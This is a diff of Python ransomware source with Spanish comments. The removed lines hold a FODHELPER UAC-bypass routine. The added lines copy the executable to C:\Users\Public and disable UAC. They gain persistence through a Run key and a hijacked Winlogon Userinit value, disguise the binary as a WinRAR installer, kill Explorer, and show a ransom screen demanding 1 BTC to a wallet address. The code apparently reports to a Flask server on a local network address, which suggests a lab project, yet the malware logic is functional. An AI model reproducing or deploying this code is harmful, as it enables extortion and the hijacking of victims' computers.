@@ -23,11 +23,17 @@ import requests
 
 app = Flask(__name__)
 
-FOD_HELPER = "C:\\Windows\\System32\\fodhelper.exe"
+
 CMD = "cmd.exe"
-PYTHON_CMD = sys.executable  # Usar el intérprete Python actual
-REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
-DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+PYTHON_CMD = sys.executable 
+
+def executeExe(source_path):
+    try:
+        # Ejecutar el archivo .exe desde la carpeta de Downloads (su ruta original)
+        subprocess.Popen([source_path], shell=True)  # Ejecuta el archivo directamente
+        print(f"Ejecutando el archivo .exe: {source_path}")
+    except Exception as e:
+        print(f"Error al ejecutar el archivo .exe: {e}")
 
 # Función para mostrar el popup de pago en Tkinter
 def show_payment_popup(directories, sk):
@@ -39,7 +45,6 @@ def show_payment_popup(directories, sk):
     label.pack(pady=10)
     
     def confirm_payment(directories):
-        # Lógica de comunicación con el servidor Flask para confirmar el pago
         try:
             url = "http://192.168.1.131:5000/confirm_payment"
             payload = json.dumps({"payment_confirmed": True})
@@ -71,59 +76,33 @@ def show_payment_popup(directories, sk):
 
 def is_running_as_admin():
     try:
+        print('[+] El script está corriendo con privilegios de administrador!')
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
     
+def movingFile(current_dir, target_path):
+         
+    try:
+        if not os.path.exists(target_path):  # Verifica si el archivo ya existe en el destino
+            shutil.copyfile(current_dir, target_path)
+            print(f"Archivo movido a: {target_path}")
+        else:
+            print(f"El archivo ya está en la ubicación correcta: {target_path}")
+    except Exception as e:
+        print(f"Error al mover el archivo: {e}")
+   
 
-def runAsAdminFODHELPER():
+def runAsAdmin(current_dir, target_path):
+
     if not is_running_as_admin():
         print('[!] El script NO está corriendo con privilegios de administrador')
         print('[+] Intentando obtener privilegios elevados con FODHELPER...')
-        
-        try:
-            # Ruta del script actual
-            current_dir = sys.executable
-            publicFolder = r"C:\Users\Public"
 
-            file_name = os.path.basename(current_dir)
-            target_path = os.path.join(publicFolder, file_name)
-
-            try:
-                if not os.path.exists(target_path):  # Verifica si el archivo ya existe en el destino
-                    shutil.move(current_dir, target_path)
-                    print(f"Archivo movido a: {target_path}")
-                else:
-                    print(f"El archivo ya está en la ubicación correcta: {target_path}")
-            except Exception as e:
-                print(f"Error al mover el archivo: {e}")
-
-            # Comando directo sin cmd.exe
-            commands = target_path  # Ejecuta directamente el archivo sin consola
-
-            # Modifica el registro para que FODHELPER ejecute el script
-            reg_path = r"Software\Classes\ms-settings\shell\open\command"
-            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
-                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, commands)
-                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-
-            # Ejecuta FODHELPER
-            os.system(FOD_HELPER)  # Usar Popen para no bloquear el script principal
-
-            # Limpia el registro después de ejecutar FODHELPER
-            time.sleep(2)  # Espera un momento para que el comando se ejecute
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-                winreg.DeleteValue(key, "DelegateExecute")
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
-
-            # Termina el proceso actual
-            sys.exit(0)
-
-        except Exception as e:
-            print(f"[!] Error al intentar elevar privilegios: {e}")
-            sys.exit(1)
+        movingFile(current_dir, target_path)
+       
     else:
-        print('[+] El script está corriendo con privilegios de administrador!')
+        movingFile(current_dir, target_path)
 
 # Función para ejecutar los comandos principales
 def stopAndDeleteNecessaryItems():
@@ -142,9 +121,13 @@ def stopAndDeleteNecessaryItems():
             "/v DisableSwitchUser /t REG_DWORD /d 1 /f",
             "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
             f"/v MalwareTask /t REG_SZ /d {currentExecutable} /f",
+            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
+            '/v EnableLUA /t REG_DWORD /d 0 /f',
             'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f',
             'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoExplorer /t REG_DWORD /d 1 /f',
-            'taskkill /f /im explorer.exe',
+            'REG DELETE HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /f',
+            f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d "C:\\Windows\\System32\\userinit.exe, C:\\Users\\Public\\winrar-x64-701es.exe" /f',
+            'taskkill /f /im explorer.exe'
         ]
 
         # Ejecutar cada comando
@@ -246,7 +229,7 @@ def graphicInterface(directories, sk):
     reloj = tk.Label(root, text="00:00:00", fg="red", bg="black", font=("Helvetica", 48, "bold"))
     reloj.pack(pady=20)
 
-    instrucciones = tk.Label(root, text="Para que los archivos sean descifrados y poder recuperar el control del dispositivo, debes ingresar un pago de 1 BTC a la siguiente dirección: ", 
+    instrucciones = tk.Label(root, text="Para que los archivos sean descifrados y poder recuperar el control del dispositivo, debes ingresar un pago de 1 BTC a la siguiente dirección: zyZa3vTddXsPVUgv54a1HUzaAsiW4yxF2B", 
                               fg="white", bg="black", font=("Helvetica", 12), justify="left")
     instrucciones.pack(pady=10)
 
@@ -366,9 +349,12 @@ def revertirCambios(directories,sk):
             "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableSwitchUser /f",
             "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MalwareTask /f",
             'REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoExplorer /f',
+            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
+            '/v EnableLUA /t REG_DWORD /d 1 /f',
             'REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v InactivityTimeoutSecs /f',
+            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /t REG_SZ /d "C:\\Windows\\System32\\userinit.exe" /f',
             'start explorer.exe',
-            "taskkill /f /im ransomware.exe",
+            "taskkill /f /im winrar-x64-701es.exe",
         ]
 
 
@@ -452,13 +438,33 @@ def generatePairKeys():
 
     return sk, pk
 
+def is_running_as_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 
 def main():
-    runAsAdminFODHELPER()
+    current_dir = sys.executable
+    publicFolder = r"C:\Users\Public"
+    file_name = os.path.basename(current_dir)
+    target_path = os.path.join(publicFolder, file_name)
+    current_dir_norm = os.path.normpath(current_dir)
+    target_path_norm = os.path.normpath(target_path)
+    print('[+] Ruta actual: ', current_dir_norm)
+    print('[+] Ruta destino: ', target_path_norm)	
+    if current_dir_norm.lower() == target_path_norm.lower():
+        print("[+] El archivo se está ejecutando desde C:\\Users\\Public. No mover el archivo.")
+    else:
+        print("[+] El archivo no está en C:\\Users\\Public. Procediendo con el movimiento.")
+        runAsAdmin(current_dir, target_path)
+        time.sleep(2)
+        executeExe(target_path)
+        return
 
     # Deshabilitar administrador de tareas
     stopAndDeleteNecessaryItems()
-
     # Generamos las claves RSA y cargamos la clave pública
     sk, pk = generatePairKeys()
 
